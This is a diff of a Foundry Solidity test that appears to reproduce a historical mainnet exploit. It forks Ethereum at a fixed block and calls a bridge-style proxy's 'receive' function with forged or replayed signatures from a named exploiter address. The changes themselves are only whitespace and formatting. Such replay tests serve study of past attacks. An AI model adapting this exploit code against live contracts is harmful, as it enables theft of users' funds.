@@ -16,13 +16,14 @@ struct Signature {
 // }
 
 contract ContractTest is Test {
+
     address exploiter = 0x941a9E3B91E1cc015702B897C512D265fAE88A9c;
     address proxy = 0x7fe68FC06e1A870DcbeE0acAe8720396DC12FC86;
     address impl = 0x373CE6Da1AEB73A9bcA412F2D3b7eD07Af3AD490;
 
     function setUp() public {
         vm.createSelectFork("mainnet", 12_751_487); // fork mainnet at block 13125070
-        // https://etherscan.io/tx/0x5c5688a9f981a07ed509481352f12f22a4bd7cea46a932c6d6bbe67cca3c54be
+            // https://etherscan.io/tx/0x5c5688a9f981a07ed509481352f12f22a4bd7cea46a932c6d6bbe67cca3c54be
     }
 
     function testExploit() public {
@@ -46,7 +47,7 @@ contract ContractTest is Test {
             s: 0x1d4aaa253afc6c5d5f893d4a572de830538aeef3b65cb6ff3bb6fec738a899d0
         });
 
-        (bool success, ) = proxy.call(
+        (bool success,) = proxy.call(
             abi.encodeWithSignature(
                 "receive(uint256,address,uint256,uint256, Signature[])",
                 1,
@@ -74,4 +75,5 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
+
 }
